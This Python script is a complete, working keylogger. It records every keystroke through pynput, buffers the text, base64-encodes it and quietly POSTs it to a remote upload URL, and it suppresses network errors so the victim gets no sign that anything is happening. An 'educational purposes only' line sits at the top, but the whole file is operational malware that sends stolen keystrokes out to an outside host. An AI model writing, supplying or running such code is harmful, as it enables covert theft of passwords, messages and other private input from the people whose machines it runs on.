"""
keylog_online.py - Keylogger that buffers keystrokes and transmits them to a
remote server via HTTP POST.

For educational purposes only. Ensure compliance with local laws before use.
"""

import base64
import os

import requests
from pynput import keyboard

SERVER_URL = os.getenv("KEYLOG_SERVER_URL", "https://yourserver.com/upload")
BUFFER_SIZE = int(os.getenv("KEYLOG_BUFFER_SIZE", "1024"))

buffer: list[str] = []


def send_data(data: str) -> None:
    """Base64-encode *data* and POST it to SERVER_URL."""
    encoded = base64.b64encode(data.encode()).decode()
    try:
        requests.post(
            SERVER_URL,
            data={"data": encoded},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=10,
            verify=True,
        )
    except requests.RequestException:
        pass


def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
    try:
        char = key.char  # type: ignore[union-attr]
    except AttributeError:
        char = f"[{key.name}]"  # type: ignore[union-attr]

    buffer.append(char)

    if len(buffer) >= BUFFER_SIZE:
        send_data("".join(buffer))
        buffer.clear()


def main() -> None:
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            pass
    if buffer:
        send_data("".join(buffer))
        buffer.clear()


if __name__ == "__main__":
    main()
